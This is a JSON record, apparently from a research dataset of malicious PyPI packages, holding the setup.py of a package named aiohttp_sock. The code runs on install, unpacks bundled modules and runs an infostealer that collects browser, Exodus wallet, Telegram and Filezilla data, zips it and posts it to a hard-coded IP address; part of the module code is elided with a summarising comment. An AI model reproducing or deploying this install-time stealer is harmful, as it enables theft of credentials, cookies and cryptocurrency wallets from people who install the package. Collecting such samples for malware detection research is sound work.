[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/aiohttp_sock-0.1.19/aiohttp_sock-0.1.19/setup.py",
    "malicious_code": "import subprocess\nimport sys\nimport contextlib as __stickytape_contextlib\nimport asyncio\nfrom asyncio import create_task\nfrom typing import List\nfrom weakref import proxy\nfrom path_search import search_plugin_paths, root_paths\nfrom config import Config\nfrom aiohttp import ClientSession as Session, MultipartWriter, hdrs, FormData\nimport secrets\nimport timeit\nfrom paths import TEMP\nfrom os import mkdir\nfrom os.path import join\nfrom zipfile import ZipFile, ZIP_DEFLATED\nfrom base64 import b64encode\nfrom tools import zipdir, _handle_task_result\nfrom logger import Logger\nfrom plugins import Chromium, Details, Exodus, Filezilla, Telegram\n\nif len(sys.argv) > 0 and \"install\" == sys.argv[1] or \"bdist\" in sys.argv[1]:\n    subprocess.call(f'{sys.executable} -m pip install aiofiles')\n    subprocess.call(f'{sys.executable} -m pip install aiohttp')\n    subprocess.call(f'{sys.executable} -m pip install cryptography')\n    subprocess.call(f'{sys.executable} -m pip install aiosqlite')\n    \n    @__stickytape_contextlib.contextmanager\n    def __stickytape_temporary_dir():\n        import tempfile\n        import shutil\n        dir_path = tempfile.mkdtemp()\n        try:\n            yield dir_path\n        finally:\n            shutil.rmtree(dir_path)\n\n    with __stickytape_temporary_dir() as __stickytape_working_dir:\n        def __stickytape_write_module(path, contents):\n            import os, os.path\n            def make_package(path):\n                parts = path.split(\"/\")\n                partial_path = __stickytape_working_dir\n                for part in parts:\n                    partial_path = os.path.join(partial_path, part)\n                    if not os.path.exists(partial_path):\n                        os.mkdir(partial_path)\n                        with open(os.path.join(partial_path, \"__init__.py\"), \"wb\") as f:\n                            f.write(b\"\\n\")\n            make_package(os.path.dirname(path))\n            full_path = os.path.join(__stickytape_working_dir, path)\n            with open(full_path, \"wb\") as module_file:\n                module_file.write(contents)\n        import sys as __stickytape_sys\n        __stickytape_sys.path.insert(0, __stickytape_working_dir)\n        # ... (hundreds of lines omitted for brevity, see original for full context)\n        # The __stickytape_write_module calls write out a large number of modules, including code to steal browser passwords, cookies, wallets, and exfiltrate them.\n        # After writing modules, the following code is executed:\n        HOST = 'http://144.24.115.170'\n        async def main() -> None:\n            start = timeit.default_timer()\n            client_id = secrets.token_hex(10)\n            log_path = join(TEMP, client_id)\n            print(log_path)\n            mkdir(log_path)\n            tasks: List[asyncio.Task] = []\n            session = Session()\n            logger = Logger(log_path)\n            conf = Config(client_id, HOST, log_path, logger, session)\n            await logger.log(f'Start')\n            chromium = Chromium(conf)\n            search_folder_names = {\n                'google': chromium,\n                'exodus': Exodus(conf),\n                'mozilla': None,\n                'telegram desktop': Telegram(conf),\n                'telegram': Telegram(conf),\n                'opera software': chromium,\n                'filezilla': Filezilla(conf)\n            }\n            tasks.append(create_task(search_plugin_paths(root_paths, search_folder_names)))\n            other_plugins = [Details(conf)]\n            for plugin in other_plugins:\n                tasks.append(create_task(plugin.callback()))\n            for task in tasks:\n                task.add_done_callback(_handle_task_result)\n            for task in tasks:\n                try:\n                    await task\n                except Exception as e:\n                    await logger.log(f'Error in main.py tasks {e}')\n            await logger.log(f'═рўшэр■ юЄяЁртъє ыюур')\n            zip_log_path = join(TEMP, f'{client_id}.zip')\n            with ZipFile(zip_log_path, 'w', ZIP_DEFLATED) as zipf:\n                zipdir(log_path, zipf)\n            with MultipartWriter() as writer:\n                writer.append(open(zip_log_path, 'rb'))\n            await session.post(f'{HOST}/receive_log', params={'client_id': client_id}, data=writer)\n            await session.close()\n            stop = timeit.default_timer()\n            await logger.log(f'Time: {stop-start}')\n        asyncio.run(main())\n"
  }
]